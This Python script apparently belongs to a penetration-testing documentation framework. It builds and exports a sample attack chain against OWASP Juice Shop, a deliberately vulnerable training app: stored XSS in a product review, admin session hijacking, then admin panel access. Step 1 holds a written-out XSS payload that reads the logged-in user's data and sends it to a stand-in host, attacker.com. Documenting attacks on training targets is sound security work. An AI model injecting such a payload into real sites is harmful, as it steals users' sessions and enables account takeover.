#!/usr/bin/env python3
"""
OWASP Juice Shop - Example Attack Chain
Author: Victor Ibhafidon

Demonstrates how to create and document attack chains for OWASP Juice Shop.

WHAT IT DOES:
- Creates example attack chains for Juice Shop vulnerabilities
- Demonstrates XSS to Admin Takeover chain
- Shows how to structure multi-step attacks
- Exports chains to JSON for documentation

HOW IT CONNECTS TO THE FRAMEWORK:
- Uses chain_analyzer.py to create AttackChain objects
- Integrates with visualizer.py for diagram generation
- Chains are saved as JSON files
- Used as templates for documenting real findings

USAGE:
 python targets/juice-shop/example_chain.py
"""

import sys
import os

# Add chains directory to path
sys.path.insert(0, os.path.join(os.path.dirname(__file__), '..', '..', 'chains'))

from chain_analyzer import (
 ChainAnalyzer, ChainStep, VulnerabilityType, ImpactLevel
)

def create_example_chain():
 """Create an example attack chain for Juice Shop"""
 
 analyzer = ChainAnalyzer()
 
 # Example: XSS to Admin Takeover Chain
 chain = analyzer.create_chain(
 title="Juice Shop - XSS to Admin Account Takeover",
 description="Stored XSS in product review leads to session hijacking and admin access",
 impact=ImpactLevel.CRITICAL
 )
 
 chain.prerequisites = [
 "Valid user account",
 "Ability to post product reviews"
 ]
 chain.context = "OWASP Juice Shop e-commerce application"
 chain.tags = {"xss", "session-hijacking", "privilege-escalation", "web", "juice-shop"}
 chain.severity = "Critical"
 
 # Step 1: Stored XSS
 step1 = ChainStep(
 step_number=1,
 vulnerability_type=VulnerabilityType.XSS,
 description="Stored XSS in product review comment field",
 endpoint="/rest/products/{id}/reviews",
 payload="<script>fetch('/rest/user/whoami', {credentials: 'include'}).then(r=>r.json()).then(d=>fetch('https://attacker.com/steal?token='+btoa(JSON.stringify(d))))</script>",
 outcome="XSS payload stored in product review"
 )
 
 # Step 2: Session Hijacking
 step2 = ChainStep(
 step_number=2,
 vulnerability_type=VulnerabilityType.SESSION_HIJACKING,
 description="Admin views product review, XSS executes in admin context, session token stolen",
 endpoint="/#/search?q=...",
 prerequisites=["XSS payload stored in product review"],
 outcome="Admin session token obtained by attacker"
 )
 
 # Step 3: Privilege Escalation
 step3 = ChainStep(
 step_number=3,
 vulnerability_type=VulnerabilityType.PRIV_ESCALATION,
 description="Use stolen admin session token to access admin panel",
 endpoint="/#/administration",
 prerequisites=["Admin session token obtained by attacker"],
 outcome="Full admin access to Juice Shop"
 )
 
 chain.add_step(step1)
 chain.add_step(step2)
 chain.add_step(step3)
 
 # Validate
 is_valid, issues = chain.validate_chain()
 
 print("=" * 80)
 print("EXAMPLE ATTACK CHAIN: Juice Shop")
 print("=" * 80)
 print()
 print(chain.get_chain_summary())
 print()
 
 if is_valid:
 print(" Chain is valid!")
 else:
 print(" Chain validation issues:")
 for issue in issues:
 print(f" - {issue}")
 
 analyzer.chains.append(chain)
 
 # Export
 output_file = os.path.join(os.path.dirname(__file__), "xss_to_admin_chain.json")
 analyzer.export_chain(chain, output_file)
 print(f"\n Chain exported to: {output_file}")
 
 # Generate markdown report
 from visualizer import generate_markdown_report
 report_file = os.path.join(os.path.dirname(__file__), "..", "..", "docs", "xss_to_admin_chain.md")
 with open(report_file, 'w') as f:
 f.write(generate_markdown_report(chain))
 print(f" Markdown report saved to: {report_file}")
 
 return analyzer

if __name__ == "__main__":
 analyzer = create_example_chain()
 print("\n" + "=" * 80)
 print("FULL REPORT")
 print("=" * 80)
 print(analyzer.generate_report())

